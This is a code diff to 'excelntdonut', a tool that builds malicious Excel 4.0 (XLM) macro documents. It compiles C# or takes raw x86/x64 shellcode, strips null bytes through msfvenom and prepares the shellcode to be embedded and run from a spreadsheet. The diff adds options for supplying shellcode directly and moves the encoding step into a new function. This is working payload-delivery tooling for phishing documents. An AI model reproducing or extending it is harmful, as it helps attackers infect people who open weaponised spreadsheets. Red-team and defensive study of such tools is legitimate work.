@@ -41,8 +41,9 @@ def main():
 
 	#Argument parsing.
 	parser = argparse.ArgumentParser()
-	parser.add_argument("-f", dest="inputFileName", help="Path to C# source code for a .NET DLL or EXE", \
-	 required=True)
+	parser.add_argument("-f", dest="inputFileName", help="Path to C# source code for a .NET DLL or EXE")
+	parser.add_argument("--s86", dest="inputShellcode86Name", help="Path to x86 shellcode")
+	parser.add_argument("--s64", dest="inputShellcode64Name", help="Path to x64 shellcode")
 	parser.add_argument("-c", dest="className", help="(Required for DLLs) name of class where \
 		payload method lives.", required=False, default="")
 	parser.add_argument("-m", dest="methodName", help="(Required for DLLs) name of method \
@@ -58,24 +59,42 @@ def main():
 		help="Perform obfuscation.", default=False, required=False)
 	args = parser.parse_args()
 	
-	#Check if source code file exists
-	if not os.path.exists(args.inputFileName):
-		print("[!] Could not open or read file [{}]".format(args.inputFileName))
+	if args.inputFileName: 
+		#Check if source code file exists
+		if not os.path.exists(args.inputFileName):
+			print("[!] Could not open or read file [{}]".format(args.inputFileName))
+			sys.exit()
+		
+		#Check for both class and method or neither
+		if args.className:
+			if not args.methodName:
+				print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
+				sys.exit()
+		else:
+			if args.methodName:
+				print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
+				sys.exit()
+
+		#Generate shellcode in x86 and x64 archs 
+		shellcode_x86 = generateShellcode(args,'x86')
+		shellcode_x64 = generateShellcode(args,'x64')
+	elif args.inputShellcode64Name and args.inputShellcode86Name: 
+		#Check if source code file exists
+		if not os.path.exists(args.inputShellcode64Name):
+			print("[!] Could not open or read file [{}]".format(args.inputShellcode64Name))
+			sys.exit()
+		if not os.path.exists(args.inputShellcode86Name):
+			print("[!] Could not open or read file [{}]".format(args.inputShellcode86Name))
+			sys.exit()
+		shellcode_x64 = args.inputShellcode64Name
+		shellcode_x86 = args.inputShellcode86Name
+	else: 
+		print("[!] Input file required (-f or -s64/-s86)")
 		sys.exit()
 
-	#Check for both class and method or neither
-	if args.className:
-		if not args.methodName:
-			print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
-			sys.exit()
-	else:
-		if args.methodName:
-			print("[x] If you execute a method within a DLL, you must specify both a classname and method name.")
-			sys.exit()
-
-	#Generate shellcode in x86 and x64 archs 
-	x86Shellcode, x86Size, x86Count = generateShellcode(args,'x86')
-	x64Shellcode, x64Size, x64Count = generateShellcode(args,'x64')
+	x86Shellcode, x86Size, x86Count = prep_macro(shellcode_x86, 'x86')
+	x64Shellcode, x64Size, x64Count = prep_macro(shellcode_x64, 'x64')
+	
 
 	frames = []
 	if not args.obfuscation:
@@ -175,7 +194,7 @@ def generateShellcode(args, arch):
 	randStr = ''.join(random.choice(string.ascii_letters) for x in range(random.randrange(6, 12)))
 	randExeName = "_excelntdonut_" + randStr + ".exe"
 	randBinName = "_excelntdonut_" + randStr + ".bin"
-	randBinName2 = "_excelntdonut_" + randStr + "2.bin"
+	
 
 	#Using MCS to compile into .NET assembly
 	print("[i] Generating your " + arch + " .NET assembly.")
@@ -199,9 +218,14 @@ def generateShellcode(args, arch):
 	with open(randBinName,'wb+') as f:
 		f.write(s)
 
+	return randBinName
+
+def prep_macro(randBinName, arch):
 	#Using msfvenom to remove nullbytes from shellcode (XLM won't support nullbytes)
 	#This might take a while to run. 
 	#Consider updating to just arch/xor_dynamic encoder since seems to work best
+	randStr = ''.join(random.choice(string.ascii_letters) for x in range(random.randrange(6, 12)))
+	randBinName2 = "_excelntdonut_" + randStr + "2.bin"
 	print("[i] Removing null bytes from " + arch + " shellcode with msfvenom")
 	cmd = "cat " + randBinName + " | msfvenom -p - -a " + arch + " --platform windows -b '\\x00' -f raw -o " + randBinName2 
 	os.system(cmd)
